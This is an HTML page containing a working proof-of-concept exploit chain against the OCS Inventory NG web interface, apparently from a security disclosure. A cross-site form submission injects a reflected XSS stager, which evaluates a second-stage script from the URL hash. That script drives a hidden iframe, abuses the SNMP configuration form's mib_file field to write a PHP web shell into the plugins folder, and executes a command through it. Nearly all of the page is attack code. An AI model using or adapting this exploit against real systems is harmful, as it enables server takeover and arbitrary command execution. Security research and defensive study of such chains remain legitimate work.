<html>
  <head></head>
  <body>
    <script>
      // Use this shitty trick to keep the syntaxic coloration
      const exploit = async () => {
        function sleep(ms = 1000) {
          return new Promise((resolve) => setTimeout(resolve, ms));
        }

        const uploadShell = async () => {
          document.body.innerHTML = "";

          /* Creates the iframe responsible to actually run the exploit */
          const frame = document.createElement("iframe");
          frame.style = "width: 0; height: 0;";
          frame.src = "/ocsreports/?function=SNMP_config";

          /* Logging purpose */
          const pre = document.createElement("pre");
          pre.style = "width: 500px;height: 500px;";

          const log = (msg) => {
            pre.innerText += `[~] ${msg}\n`;
          };

          /* Adds the frame and the logger to the DOM */
          document.body.appendChild(pre);
          document.body.appendChild(frame);

          log("Iframe loading ...");

          /* Waits a bit for the iframe to load */
          await sleep();

          log("Iframe should be loaded now ...");

          log("Searching for the vulnerable page link");

          const link = frame.contentWindow.document.querySelector(
            ".nav-pills > li:nth-child(4) > a:nth-child(1)"
          );

          log("Click the link");

          link.click();

          log("Waiting for redirection");

          await sleep();

          log("Should be redirected ...");

          log("Searching for the vulnerable form HTLM Element");

          const form = frame.contentWindow.document.querySelector(
            "#snmp_config"
          );

          if (!form) {
            log("Vulnerable form not found, retry later");
            return;
          }

          log("Found the vulnerable form");

          const inputs = form.querySelectorAll("input");

          log("Updating the form to make it upload a PHP shell");

          const update_snmp = frame.contentWindow.document.createElement(
            "input"
          );
          update_snmp.name = "update_snmp";
          update_snmp.value = "Send";
          form.appendChild(update_snmp);

          const vulnerableInput = frame.contentWindow.document.createElement(
            "input"
          );

          const shellName = `xmco.php`;

          const payload = `test -Lf /usr/share/ocsinventory-reports/ocsreports/plugins/${shellName} -- <?=\`$_GET[1]\`?>`;

          vulnerableInput.type = "hidden";
          vulnerableInput.name = "ocs[]";
          vulnerableInput.value = `mib_file=${encodeURIComponent(payload)}`;

          form.action = "/ocsreports/ajax.php?function=SNMP_config";

          form.appendChild(vulnerableInput);

          log("Submitting the form ... ");
          form.submit();

          const { pathname, origin } = window.location;

          const pathToOcs = (origin + pathname).replace("ajax.php", "");
          const pathToShell = `${pathToOcs}/plugins/${shellName}`;
          const command = `id`;

          log(`Shell Uploaded: ${pathToShell}`);

          log(`Executing the command '${command}' on the server`);

          await sleep();

          const res = await fetch(`${pathToShell}?1=${command}`);
          const text = await res.text();

          log("Result: ");
          log(text);
        };

        await uploadShell();
      };

      const targetUrl = "http://127.0.0.1/ocsreports";
      const form = document.createElement("form");

      const payload = `const exploit = ${exploit.toString()};exploit();`;

      form.action = `${targetUrl}/ajax.php#${payload}`;
      form.method = "POST";

      const hiddenInput = document.createElement("input");

      const encode = encodeURIComponent;

      const stager = `<img src=x onerror=eval(decodeURIComponent(window.location.hash.substr(1)))>`;

      hiddenInput.type = "hidden";
      hiddenInput.name = "ocs[]";
      hiddenInput.value = `draw=${encode(stager)}`;

      // Adds the hidden input to the form element
      form.appendChild(hiddenInput);

      // Adds the form to the DOM
      document.body.appendChild(form);

      form.submit();
    </script>
  </body>
</html>
